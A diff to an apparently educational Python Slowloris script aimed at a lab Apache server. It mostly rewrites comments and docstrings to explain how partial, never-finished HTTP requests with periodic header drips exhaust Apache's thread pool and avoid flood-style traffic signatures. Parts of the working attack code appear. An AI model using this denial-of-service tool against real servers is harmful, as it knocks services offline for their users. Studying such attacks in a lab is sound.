@@ -6,10 +6,12 @@
               Target: Apache on 192.168.100.20:80
 ====================================================
 
-Slowloris opens many TCP connections and drips one byte
-of HTTP headers every few seconds, never completing the
-request. Apache's fixed thread pool exhausts itself
-holding these "legitimate-looking" connections open.
+Slowloris opens many TCP connections and drips one keep-alive
+HTTP header line (e.g. "X-a: 1234\r\n") every few seconds,
+never completing the request with the final blank line. Apache's
+fixed thread pool exhausts itself holding these "legitimate-looking"
+connections open because each one looks like a slow-but-in-progress
+HTTP client.
 
 Key teaching point: Nginx (event-driven) is immune.
 Apache (thread-per-connection) is not.
@@ -31,7 +33,12 @@ KEEP_ALIVE_INTERVAL = 10 # seconds between header drips
 
 
 def create_socket(target_ip, target_port):
-    """Open a TCP connection and send a partial HTTP GET header."""
+    """
+    Open a TCP connection and send a partial HTTP GET header.
+    The request is deliberately left incomplete — no final blank
+    line (\r\n\r\n) is sent, so Apache holds the thread open waiting
+    for the rest of the headers.
+    """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
     try:
@@ -52,8 +59,11 @@ def slowloris(target_ip=TARGET_IP, target_port=TARGET_PORT,
               num_sockets=NUM_SOCKETS, duration=60):
     """
     Maintain `num_sockets` half-open connections against target.
-    Every `KEEP_ALIVE_INTERVAL` seconds, send a single extra header
-    line to each socket to prevent timeout, never completing the request.
+    Every KEEP_ALIVE_INTERVAL seconds, send one keep-alive header
+    line ("X-a: <random_int>\\r\\n") to each socket to prevent
+    Apache's timeout from closing it, while never completing the
+    HTTP request.  This drains the server's thread pool without
+    generating the volumetric traffic signature of a SYN or UDP flood.
     """
     logging.info(f"Starting Slowloris -> {target_ip}:{target_port}")
     logging.info(f"Target sockets: {num_sockets}  |  Duration: {duration}s")
@@ -73,7 +83,9 @@ def slowloris(target_ip=TARGET_IP, target_port=TARGET_PORT,
     while time.time() < end_time:
         logging.info(f"Active sockets: {len(sockets)} / {num_sockets}")
 
-        # Send a keep-alive header drip to each socket
+        # Send one keep-alive header line to each socket.
+        # This is a full "X-a: N\r\n" header, not a single byte —
+        # the key property is that the request body is never terminated.
         dead = []
         for s in sockets:
             try:
